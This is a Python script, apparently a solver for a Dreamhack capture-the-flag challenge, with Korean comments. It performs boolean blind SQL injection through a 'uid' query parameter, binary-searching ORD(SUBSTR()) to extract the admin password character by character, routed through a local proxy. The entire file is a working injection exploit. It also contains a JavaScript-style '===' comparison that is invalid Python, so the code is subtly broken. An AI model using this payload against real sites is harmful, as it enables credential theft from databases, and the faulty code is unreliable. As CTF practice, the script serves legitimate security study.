import requests

url = "http://host3.dreamhack.games:10880/?uid="
pwd = ""
flag = False

proxies = {
    "http": "http://127.0.0.1:8888",
    "https": "http://127.0.0.1:8888"
}

def decode_ord_value(val):
    """
    ORD() 반환값을 기반으로 ASCII / UTF-8 자동 디코딩
    """

    # 1바이트 ASCII
    if val <= 0x7F:
        return chr(val)

    # 2바이트 UTF-8 (rare)
    elif val <= 0xFFFF:
        # 2바이트 분해
        b1 = (val >> 8) & 0xFF
        b2 = val & 0xFF
        return bytes([b1, b2]).decode("utf-8", errors="replace")

    # 3바이트 UTF-8 (한글 대부분)
    elif val <= 0xFFFFFF:
        b1 = (val >> 16) & 0xFF
        b2 = (val >> 8) & 0xFF
        b3 = val & 0xFF
        return bytes([b1, b2, b3]).decode("utf-8", errors="replace")

    # 4바이트 UTF-8
    elif val <= 0xFFFFFFFF:
        b1 = (val >> 24) & 0xFF
        b2 = (val >> 16) & 0xFF
        b3 = (val >> 8) & 0xFF
        b4 = val & 0xFF
        return bytes([b1, b2, b3, b4]).decode("utf-8", errors="replace")

    return "�"  # fallback


for i in range(1, 50):

    low = 1
    high = 20000000   # UTF-8 한글도 포함

    while low <= high:
        mid = (low + high) // 2

        payload = (
            f"admin' AND (ORD(SUBSTR((SELECT upw FROM users WHERE uid='admin'),"
            f"{i},1))>{mid}) AND '1'='1"
        )

        r = requests.get(url + payload, proxies=proxies, verify=False)

        if "exists" in r.text:
            low = mid + 1
        else:
            high = mid - 1

        if low > high:
            real_val = high + 1  # 실제 문자코드 확정
            char = decode_ord_value(real_val)
            pwd += char
            print(f"[+] {i}번째 문자 → 코드:{real_val} → '{char}'")

            if char === "}":
                flag = True

            break

    # 종료 조건: "}" 문자 (플래그 종료)
    if flag:
        break

print("\n[+] 최종 패스워드:", pwd)
